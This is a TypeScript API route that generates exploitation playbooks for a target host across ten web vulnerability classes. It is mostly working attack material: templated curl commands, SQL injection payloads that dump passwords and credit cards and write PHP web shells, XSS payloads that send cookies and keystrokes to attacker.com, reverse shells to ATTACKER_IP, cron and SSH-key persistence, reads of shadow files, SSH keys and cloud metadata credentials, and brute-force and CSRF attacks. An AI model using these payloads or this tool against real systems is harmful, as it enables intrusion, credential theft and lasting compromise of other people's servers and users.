// API: Exploit Chain Builder
// POST /api/osint/exploit-chains - Build exploitation paths from vulnerabilities

import { NextRequest, NextResponse } from 'next/server';

export async function POST(request: NextRequest) {
  try {
    const { vulnerability, target } = await request.json();

    const exploitChain = buildExploitChain(vulnerability, target);

    return NextResponse.json({
      success: true,
      chain: exploitChain
    });

  } catch (error: any) {
    return NextResponse.json(
      { success: false, error: error.message },
      { status: 500 }
    );
  }
}

function buildExploitChain(vuln: any, target: string): any {
  const chains: any = {
    'SQL Injection': buildSQLInjectionChain(target, vuln),
    'Cross-Site Scripting (XSS)': buildXSSChain(target, vuln),
    'OS Command Injection': buildCommandInjectionChain(target, vuln),
    'Path Traversal': buildPathTraversalChain(target, vuln),
    'Server-Side Request Forgery (SSRF)': buildSSRFChain(target, vuln),
    'XML External Entity (XXE)': buildXXEChain(target, vuln),
    'Exposed Credentials': buildCredentialChain(target, vuln),
    'Default Credentials': buildDefaultCredChain(target, vuln),
    'Missing CSRF Protection': buildCSRFChain(target, vuln),
    'Missing Security Headers': buildHeadersChain(target, vuln)
  };

  return chains[vuln.type] || { steps: [], tools: [], notes: 'Exploit chain not available' };
}

// SQL Injection Exploitation Chain
function buildSQLInjectionChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Confirm Injection Point',
        description: 'Test basic SQL injection',
        payloads: [
          { payload: "'", expected: 'SQL error message' },
          { payload: "' OR '1'='1", expected: 'Different response' },
          { payload: "' AND '1'='2", expected: 'Empty result' }
        ],
        commands: [
          `curl "http://${target}${vuln.location}'" -v`,
          `curl "http://${target}${vuln.location}' OR '1'='1" -v`
        ]
      },
      {
        step: 2,
        title: 'Identify Database Type',
        description: 'Determine which DBMS is running',
        payloads: [
          { payload: "' AND 1=1--", db: 'MySQL/MSSQL' },
          { payload: "' AND 1=1#", db: 'MySQL' },
          { payload: "' AND 1=1/*", db: 'MySQL/PostgreSQL' },
          { payload: "' || '1", db: 'Oracle/PostgreSQL' }
        ],
        commands: [
          `curl "http://${target}${vuln.location}' AND 1=1--" -v`
        ]
      },
      {
        step: 3,
        title: 'Enumerate Database',
        description: 'Extract database information',
        payloads: [
          { payload: "' UNION SELECT NULL--", purpose: 'Find column count' },
          { payload: "' UNION SELECT NULL,NULL--", purpose: 'Find column count' },
          { payload: "' UNION SELECT database(),user()--", purpose: 'Get DB name & user (MySQL)' },
          { payload: "' UNION SELECT version(),current_user()--", purpose: 'Version info' }
        ],
        commands: [
          `curl "http://${target}${vuln.location}' UNION SELECT NULL--" -v`,
          `curl "http://${target}${vuln.location}' UNION SELECT database(),user()--" -v`
        ]
      },
      {
        step: 4,
        title: 'Extract Tables',
        description: 'List all database tables',
        payloads: [
          {
            payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            purpose: 'List all tables (MySQL)'
          },
          {
            payload: "' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--",
            purpose: 'List tables (PostgreSQL)'
          }
        ],
        commands: [
          `curl "http://${target}${vuln.location}' UNION SELECT table_name,NULL FROM information_schema.tables--" -v`
        ]
      },
      {
        step: 5,
        title: 'Extract Columns',
        description: 'Get column names from target table',
        payloads: [
          {
            payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
            purpose: 'List columns in users table'
          }
        ],
        commands: [
          `curl "http://${target}${vuln.location}' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--" -v`
        ]
      },
      {
        step: 6,
        title: 'Dump Data',
        description: 'Extract sensitive data',
        payloads: [
          {
            payload: "' UNION SELECT username,password FROM users--",
            purpose: 'Dump credentials'
          },
          {
            payload: "' UNION SELECT email,credit_card FROM customers--",
            purpose: 'Dump sensitive info'
          }
        ],
        commands: [
          `curl "http://${target}${vuln.location}' UNION SELECT username,password FROM users--" -v`,
          `curl "http://${target}${vuln.location}' UNION SELECT CONCAT(username,':',password),NULL FROM users--" -v`
        ]
      },
      {
        step: 7,
        title: 'Advanced Exploitation',
        description: 'File access, shell, privilege escalation',
        payloads: [
          {
            payload: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",
            purpose: 'Read files (MySQL with FILE privilege)'
          },
          {
            payload: "' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--",
            purpose: 'Write web shell (MySQL)'
          },
          {
            payload: "'; EXEC xp_cmdshell('whoami')--",
            purpose: 'Command execution (MSSQL)'
          }
        ],
        commands: [
          `curl "http://${target}${vuln.location}' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--" -v`,
          `curl "http://${target}/shell.php?cmd=whoami" # After writing shell`
        ]
      }
    ],
    tools: [
      {
        name: 'SQLMap',
        command: `sqlmap -u "http://${target}${vuln.location}*" --batch --dump`,
        description: 'Automated SQL injection tool'
      },
      {
        name: 'Manual curl',
        command: `curl "http://${target}${vuln.location}' UNION SELECT..." -v`,
        description: 'Manual exploitation'
      },
      {
        name: 'Burp Suite',
        description: 'Intercept and modify requests'
      }
    ],
    notes: [
      'Always URL encode special characters',
      'Try different comment styles (--,#,/*)',
      'Use NULL in UNION SELECT for unknown columns',
      'Check for WAF (Web Application Firewall)',
      'Try time-based blind injection if no output'
    ]
  };
}

// XSS Exploitation Chain
function buildXSSChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Confirm XSS',
        description: 'Test basic injection',
        payloads: [
          { payload: '<script>alert(1)</script>', context: 'HTML' },
          { payload: '<img src=x onerror=alert(1)>', context: 'HTML' },
          { payload: '"><script>alert(1)</script>', context: 'Inside tag' },
          { payload: "'-alert(1)-'", context: 'JavaScript string' }
        ],
        commands: [
          `curl "http://${target}${vuln.location}<script>alert(1)</script>" -v`,
          `curl "http://${target}${vuln.location}<img src=x onerror=alert(1)>" -v`
        ]
      },
      {
        step: 2,
        title: 'Bypass Filters',
        description: 'Evade XSS filters and WAF',
        payloads: [
          { payload: '<ScRiPt>alert(1)</sCrIpT>', technique: 'Case variation' },
          { payload: '<script>alert(String.fromCharCode(88,83,83))</script>', technique: 'Encoding' },
          { payload: '<svg/onload=alert(1)>', technique: 'Alternative tags' },
          { payload: '<iframe src=javascript:alert(1)>', technique: 'JavaScript protocol' },
          { payload: '<img src=x onerror="alert`1`">', technique: 'Template literals' }
        ],
        commands: [
          `curl "http://${target}${vuln.location}<svg/onload=alert(1)>" -v`
        ]
      },
      {
        step: 3,
        title: 'Cookie Theft',
        description: 'Steal session cookies',
        payloads: [
          {
            payload: '<script>fetch("http://attacker.com/?c="+document.cookie)</script>',
            purpose: 'Send cookies to attacker server'
          },
          {
            payload: '<script>new Image().src="http://attacker.com/?c="+document.cookie</script>',
            purpose: 'Cookie exfiltration via image'
          },
          {
            payload: '<script>location="http://attacker.com/?c="+document.cookie</script>',
            purpose: 'Redirect with cookies'
          }
        ],
        commands: [
          `# Start listener: nc -lvp 80`,
          `curl "http://${target}${vuln.location}<script>new Image().src='http://YOUR_IP/?c='+document.cookie</script>"`
        ]
      },
      {
        step: 4,
        title: 'Keylogging',
        description: 'Capture user keystrokes',
        payloads: [
          {
            payload: '<script>document.onkeypress=function(e){fetch("http://attacker.com/?k="+e.key)}</script>',
            purpose: 'Log all keystrokes'
          }
        ]
      },
      {
        step: 5,
        title: 'Phishing',
        description: 'Inject fake login form',
        payloads: [
          {
            payload: `<script>document.body.innerHTML='<form onsubmit="fetch(\'http://attacker.com/?u=\'+this.username.value+\'&p=\'+this.password.value);return false"><input name=username><input name=password type=password><input type=submit></form>'</script>`,
            purpose: 'Fake login overlay'
          }
        ]
      },
      {
        step: 6,
        title: 'BeEF Hook',
        description: 'Browser Exploitation Framework',
        payloads: [
          {
            payload: '<script src="http://attacker.com:3000/hook.js"></script>',
            purpose: 'Hook browser to BeEF'
          }
        ],
        commands: [
          `# Start BeEF: ./beef`,
          `curl "http://${target}${vuln.location}<script src='http://YOUR_IP:3000/hook.js'></script>"`
        ]
      }
    ],
    tools: [
      {
        name: 'XSS Hunter',
        description: 'Blind XSS detection platform'
      },
      {
        name: 'BeEF',
        command: './beef',
        description: 'Browser Exploitation Framework'
      },
      {
        name: 'XSStrike',
        command: `xsstrike -u "http://${target}${vuln.location}"`,
        description: 'Advanced XSS scanner'
      }
    ],
    notes: [
      'Check if cookies have HttpOnly flag',
      'Test in different contexts (HTML, JS, attribute)',
      'Use URL encoding for special chars',
      'Try polyglot payloads',
      'Consider CSP bypass techniques'
    ]
  };
}

// Command Injection Chain
function buildCommandInjectionChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Confirm Injection',
        description: 'Test command execution',
        payloads: [
          { payload: '; whoami', separator: 'Semicolon' },
          { payload: '| whoami', separator: 'Pipe' },
          { payload: '`whoami`', separator: 'Backticks' },
          { payload: '$(whoami)', separator: 'Command substitution' },
          { payload: '& whoami &', separator: 'Background (Windows)' }
        ],
        commands: [
          `curl "http://${target}${vuln.location};whoami" -v`,
          `curl "http://${target}${vuln.location}|whoami" -v`
        ]
      },
      {
        step: 2,
        title: 'System Enumeration',
        description: 'Gather system information',
        payloads: [
          { payload: '; uname -a', info: 'OS info' },
          { payload: '; cat /etc/passwd', info: 'User accounts' },
          { payload: '; ifconfig', info: 'Network config' },
          { payload: '; ps aux', info: 'Running processes' },
          { payload: '; ls -la /', info: 'File system' }
        ],
        commands: [
          `curl "http://${target}${vuln.location};uname -a" -v`,
          `curl "http://${target}${vuln.location};cat /etc/passwd" -v`
        ]
      },
      {
        step: 3,
        title: 'Reverse Shell',
        description: 'Establish interactive shell',
        payloads: [
          {
            payload: '; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
            shell: 'Bash reverse shell'
          },
          {
            payload: '; nc ATTACKER_IP 4444 -e /bin/bash',
            shell: 'Netcat reverse shell'
          },
          {
            payload: '; python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"ATTACKER_IP\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\"/bin/bash\\",\\"-i\\"])"',
            shell: 'Python reverse shell'
          }
        ],
        commands: [
          `# On attacker: nc -lvp 4444`,
          `curl "http://${target}${vuln.location};bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"`
        ]
      },
      {
        step: 4,
        title: 'Privilege Escalation',
        description: 'Elevate privileges',
        payloads: [
          { payload: '; sudo -l', check: 'Sudo permissions' },
          { payload: '; find / -perm -4000 2>/dev/null', check: 'SUID binaries' },
          { payload: '; cat /etc/shadow', check: 'Password hashes' },
          { payload: '; crontab -l', check: 'Cron jobs' }
        ],
        commands: [
          `curl "http://${target}${vuln.location};sudo -l" -v`,
          `curl "http://${target}${vuln.location};find / -perm -4000" -v`
        ]
      },
      {
        step: 5,
        title: 'Persistence',
        description: 'Maintain access',
        payloads: [
          {
            payload: '; echo "ssh-rsa YOUR_KEY" >> ~/.ssh/authorized_keys',
            method: 'SSH key backdoor'
          },
          {
            payload: '; (crontab -l; echo "* * * * * /bin/bash -c \\'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\'")| crontab -',
            method: 'Cron reverse shell'
          }
        ]
      }
    ],
    tools: [
      {
        name: 'Netcat',
        command: 'nc -lvp 4444',
        description: 'Reverse shell listener'
      },
      {
        name: 'Commix',
        command: `commix -u "http://${target}${vuln.location}*"`,
        description: 'Automated command injection'
      },
      {
        name: 'Metasploit',
        description: 'Exploitation framework'
      }
    ],
    notes: [
      'URL encode payloads',
      'Try different separators',
      'Check for command filtering',
      'Use obfuscation if filtered',
      'Stabilize shell with Python pty'
    ]
  };
}

// Path Traversal Chain
function buildPathTraversalChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Confirm Traversal',
        description: 'Access /etc/passwd',
        payloads: [
          { payload: '../../etc/passwd', depth: '2 levels' },
          { payload: '../../../etc/passwd', depth: '3 levels' },
          { payload: '../../../../../../../../etc/passwd', depth: 'Deep traversal' },
          { payload: '....//....//etc/passwd', encoding: 'Double encoding' },
          { payload: '..%2F..%2Fetc%2Fpasswd', encoding: 'URL encoding' }
        ],
        commands: [
          `curl "http://${target}${vuln.location}../../etc/passwd" -v`,
          `curl "http://${target}${vuln.location}../../../../../../../../etc/passwd" -v`
        ]
      },
      {
        step: 2,
        title: 'Enumerate Configuration',
        description: 'Read application configs',
        files: [
          { path: '../../../app/config.php', info: 'App config' },
          { path: '../../../.env', info: 'Environment variables' },
          { path: '../../../database.yml', info: 'Database credentials' },
          { path: '../../../../etc/nginx/nginx.conf', info: 'Web server config' },
          { path: '../../../../var/www/html/wp-config.php', info: 'WordPress config' }
        ],
        commands: [
          `curl "http://${target}${vuln.location}../../../.env" -v`,
          `curl "http://${target}${vuln.location}../../../app/config.php" -v`
        ]
      },
      {
        step: 3,
        title: 'Access Logs',
        description: 'Read log files',
        files: [
          { path: '../../../../var/log/apache2/access.log', log: 'Apache logs' },
          { path: '../../../../var/log/nginx/access.log', log: 'Nginx logs' },
          { path: '../../../../var/log/auth.log', log: 'Authentication logs' }
        ]
      },
      {
        step: 4,
        title: 'Source Code Disclosure',
        description: 'Read application source',
        files: [
          { path: '../../../index.php', type: 'Source code' },
          { path: '../../../admin/login.php', type: 'Admin panel code' },
          { path: '../../../api/auth.php', type: 'Auth code' }
        ]
      },
      {
        step: 5,
        title: 'SSH Keys',
        description: 'Extract private keys',
        files: [
          { path: '../../../../root/.ssh/id_rsa', key: 'Root SSH key' },
          { path: '../../../../home/user/.ssh/id_rsa', key: 'User SSH key' }
        ],
        commands: [
          `curl "http://${target}${vuln.location}../../../../root/.ssh/id_rsa" -v`,
          `# Use key: ssh -i id_rsa root@${target}`
        ]
      }
    ],
    tools: [
      {
        name: 'DotDotPwn',
        command: `dotdotpwn -m http -h ${target} -x 8080 -f /etc/passwd`,
        description: 'Path traversal fuzzer'
      },
      {
        name: 'ffuf',
        command: `ffuf -u "http://${target}${vuln.location}FUZZ" -w wordlist.txt`,
        description: 'Fast fuzzer'
      }
    ],
    notes: [
      'Try different depths (../../ vs ../../../)',
      'Test URL encoding variants',
      'Try null byte (%00) after payload',
      'Check for OS-specific paths',
      'Combine with LFI to RCE'
    ]
  };
}

// SSRF Chain
function buildSSRFChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Confirm SSRF',
        description: 'Test internal network access',
        payloads: [
          { payload: 'http://127.0.0.1', target: 'Localhost' },
          { payload: 'http://localhost', target: 'Localhost (name)' },
          { payload: 'http://[::1]', target: 'IPv6 localhost' },
          { payload: 'http://169.254.169.254', target: 'AWS metadata (if cloud)' }
        ]
      },
      {
        step: 2,
        title: 'Cloud Metadata',
        description: 'Extract cloud credentials',
        payloads: [
          {
            payload: 'http://169.254.169.254/latest/meta-data/',
            cloud: 'AWS - Root metadata'
          },
          {
            payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            cloud: 'AWS - IAM roles'
          },
          {
            payload: 'http://metadata.google.internal/computeMetadata/v1/',
            cloud: 'GCP metadata'
          },
          {
            payload: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            cloud: 'Azure metadata'
          }
        ],
        commands: [
          `curl "http://${target}${vuln.location}http://169.254.169.254/latest/meta-data/" -v`
        ]
      },
      {
        step: 3,
        title: 'Internal Port Scan',
        description: 'Scan internal services',
        payloads: [
          { payload: 'http://localhost:22', service: 'SSH' },
          { payload: 'http://localhost:3306', service: 'MySQL' },
          { payload: 'http://localhost:5432', service: 'PostgreSQL' },
          { payload: 'http://localhost:6379', service: 'Redis' },
          { payload: 'http://localhost:27017', service: 'MongoDB' }
        ]
      },
      {
        step: 4,
        title: 'File Protocol',
        description: 'Read local files',
        payloads: [
          { payload: 'file:///etc/passwd', access: 'Local file' },
          { payload: 'file:///etc/shadow', access: 'Shadow file' },
          { payload: 'file:///var/www/html/config.php', access: 'Web config' }
        ]
      }
    ],
    tools: [
      {
        name: 'SSRFMap',
        command: `python ssrfmap.py -r request.txt -p url`,
        description: 'SSRF exploitation tool'
      }
    ],
    notes: [
      'Try protocol variations (http://, file://, gopher://)',
      'Test bypass filters (localhost vs 127.0.0.1)',
      'Use @ for URL parsing bypass',
      'Try DNS rebinding',
      'Chain with other vulns'
    ]
  };
}

// XXE Chain
function buildXXEChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Confirm XXE',
        description: 'Test external entity processing',
        payloads: [
          {
            payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            result: 'File disclosure'
          },
          {
            payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><root>&xxe;</root>',
            result: 'Out-of-band detection'
          }
        ],
        commands: [
          `curl -X POST "http://${target}" -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'`
        ]
      },
      {
        step: 2,
        title: 'Out-of-Band XXE',
        description: 'Exfiltrate data via HTTP',
        payloads: [
          {
            payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>',
            method: 'External DTD'
          }
        ]
      },
      {
        step: 3,
        title: 'SSRF via XXE',
        description: 'Internal network access',
        payloads: [
          {
            payload: '<!ENTITY xxe SYSTEM "http://localhost:8080/admin">',
            target: 'Internal services'
          }
        ]
      }
    ],
    tools: [
      {
        name: 'XXEInjector',
        command: 'ruby XXEinjector.rb --host=192.168.1.1 --path=/upload --file=test.xml',
        description: 'Automated XXE exploitation'
      }
    ],
    notes: [
      'Test both in-band and out-of-band',
      'Try parameter entities for blind XXE',
      'Use external DTD for exfiltration',
      'Test file upload functionality'
    ]
  };
}

// Exposed Credentials Chain
function buildCredentialChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Download Credentials',
        description: 'Extract exposed files',
        commands: [
          `curl "http://${target}${vuln.location}" -o credentials.txt`,
          `curl "http://${target}/.env" -o .env`,
          `curl "http://${target}/.git/config" -o git_config`
        ]
      },
      {
        step: 2,
        title: 'Parse Credentials',
        description: 'Extract keys and passwords',
        commands: [
          `grep -i "password" credentials.txt`,
          `grep -i "api_key" credentials.txt`,
          `grep -i "secret" credentials.txt`,
          `grep "DB_" .env`
        ]
      },
      {
        step: 3,
        title: 'Test Credentials',
        description: 'Try extracted credentials',
        commands: [
          `mysql -h ${target} -u DB_USER -p # Use DB password`,
          `ssh user@${target} # Try SSH`,
          `curl -H "Authorization: Bearer API_KEY" http://${target}/api/`
        ]
      }
    ],
    tools: [
      {
        name: 'git-dumper',
        command: `git-dumper http://${target}/.git/ output/`,
        description: 'Download exposed .git directories'
      }
    ],
    notes: [
      'Check for .git, .env, config files',
      'Try common backup files (.bak, ~, .old)',
      'Look for API keys, DB passwords',
      'Test credentials on multiple services'
    ]
  };
}

// Default Credentials Chain
function buildDefaultCredChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Login with Defaults',
        description: 'Access admin panel',
        commands: [
          `curl -X POST "http://${target}/admin/login" -d "username=${vuln.payload.split(':')[0]}&password=${vuln.payload.split(':')[1]}" -v`,
          `# Or use browser: http://${target}/admin`
        ]
      },
      {
        step: 2,
        title: 'Explore Admin Panel',
        description: 'Find sensitive functions',
        actions: [
          'User management',
          'File upload',
          'Database access',
          'Configuration changes',
          'Log viewing'
        ]
      },
      {
        step: 3,
        title: 'Upload Web Shell',
        description: 'If file upload exists',
        commands: [
          `echo '<?php system($_GET["cmd"]); ?>' > shell.php`,
          `# Upload shell.php via admin panel`,
          `curl "http://${target}/uploads/shell.php?cmd=whoami"`
        ]
      }
    ],
    tools: [
      {
        name: 'Hydra',
        command: `hydra -L users.txt -P passwords.txt ${target} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"`,
        description: 'Brute force login'
      }
    ],
    notes: [
      'Change default password immediately after access',
      'Check for other default accounts',
      'Look for file upload functionality',
      'Explore all admin features'
    ]
  };
}

// CSRF Chain
function buildCSRFChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Identify Target Action',
        description: 'Find vulnerable form',
        actions: [
          'Password change',
          'Email change',
          'Account deletion',
          'Fund transfer',
          'Admin creation'
        ]
      },
      {
        step: 2,
        title: 'Craft CSRF PoC',
        description: 'Create exploit HTML',
        payload: `<html>
  <body>
    <form action="http://${target}/change-password" method="POST" id="csrf">
      <input type="hidden" name="password" value="hacked123" />
    </form>
    <script>document.getElementById('csrf').submit();</script>
  </body>
</html>`
      },
      {
        step: 3,
        title: 'Host and Send',
        description: 'Deliver exploit to victim',
        commands: [
          `python3 -m http.server 8080`,
          `# Send link to victim: http://YOUR_IP:8080/csrf.html`
        ]
      }
    ],
    tools: [
      {
        name: 'CSRF Tester (Burp)',
        description: 'Burp Suite CSRF PoC generator'
      }
    ],
    notes: [
      'Victim must be authenticated',
      'Social engineering required',
      'Can chain with XSS for auto-execution',
      'Test on state-changing actions only'
    ]
  };
}

// Security Headers Chain
function buildHeadersChain(target: string, vuln: any): any {
  return {
    vulnerability: vuln.type,
    severity: vuln.severity,
    steps: [
      {
        step: 1,
        title: 'Exploit Missing Headers',
        description: 'Attack vectors based on missing headers',
        attacks: [
          {
            header: 'X-Frame-Options',
            attack: 'Clickjacking',
            payload: `<iframe src="http://${target}"></iframe>`
          },
          {
            header: 'Content-Security-Policy',
            attack: 'XSS (no CSP)',
            payload: 'Inject scripts without CSP blocking'
          },
          {
            header: 'X-Content-Type-Options',
            attack: 'MIME sniffing',
            payload: 'Upload text file executed as JS'
          }
        ]
      }
    ],
    notes: [
      'Missing headers enable other attacks',
      'Clickjacking via iframe',
      'XSS easier without CSP',
      'Recommend adding all security headers'
    ]
  };
}
